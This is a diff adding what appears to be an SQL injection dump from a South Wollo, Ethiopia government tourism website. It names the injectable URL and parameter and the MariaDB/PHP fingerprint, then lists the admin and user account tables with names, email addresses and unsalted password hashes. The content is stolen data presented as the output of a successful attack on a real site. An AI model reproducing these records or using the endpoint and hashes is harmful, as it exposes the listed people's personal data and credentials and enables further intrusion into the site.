@@ -1,0 +1,44 @@
+.gov Government
+
+.et Ethiopia
+
+South Wollo Tourism Attraction/Amhara Ethiopia
+
+https://southwollotourism.gov.et/info.php?place_id=P-495315&address=Kalu,%20Ethiopia
+
+the back-end DBMS is MySQL
+web application technology: LiteSpeed, PHP, PHP 7.4.20
+the back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+banner: '10.3.29-MariaDB-cll-lve'
+
+available databases [2]:
+[+] information_schema
+[+] wwwsouthwollotou_tourist
+
+Database: wwwsouthwollotou_tourist
+Table: admin
+[1 entry]
++-----------+----------+----------+----------------------+----------------------------------+
+| firstname | lastname | username | email                | password                         |
++-----------+----------+----------+----------------------+----------------------------------+
+| south     | wollo    | admin    | swollotour@gmail.com | 003cee18e5a879928941c8d2efd153ea |
++-----------+----------+----------+----------------------+----------------------------------+
+
+
+Database: wwwsouthwollotou_tourist
+Table: account
+[10 entries]
++----------------+----------+-----------+-------------------------------+----------------------------------+
+| firstname      | lastname | username  | email                         | password                         |
++----------------+----------+-----------+-------------------------------+----------------------------------+
+| Tadesse        | Birara   | tadesse   | tadesse@gmail.com             | 31d3a73e10472e880a1bf035052294b4 |
+| bayew          | Dessie   | user      | baye@gmail.com                | 85c3af957626753a965327996575d474 |
+| bayew          | Dessie   | today     | bbb@gmail.com                 | 96f6872f7682e352910b78f47a1570d8 |
+| Tadesse        | Birara   | tadessee  | birara@gmail.com              | 31d3a73e10472e880a1bf035052294b4 |
+| Hiruye Slassie | Bayew    | hiruye    | hiruye@gmail.com              | 85c3af957626753a965327996575d474 |
+| wollo          | Times    | wollo     | author@j.com                  | 064102805555b569d90cd1e5dc6b8fe3 |
+| Berhanu        | Demeke   | bmw       | miklol9@gmail.com             | eda670710a9f242d641151379c494dea |
+| mohammed       | hussen   | mohammed  | mdfhussen@gmail.com           | 3ba91ae9881d835ce2fdade7a6a5bb79 |
+| Kassa          | Mohammed | Kassa     | selemonmehammedali8@gmail.com | 3f661e0e70188874f17e6e9fff0e7842 |
+| ayu            | melkam   | ayumelkam | ayuuu@gmail.com               | 69f6c2f8550811183eb27ff153de82b8 |
++----------------+----------+-----------+-------------------------------+----------------------------------+
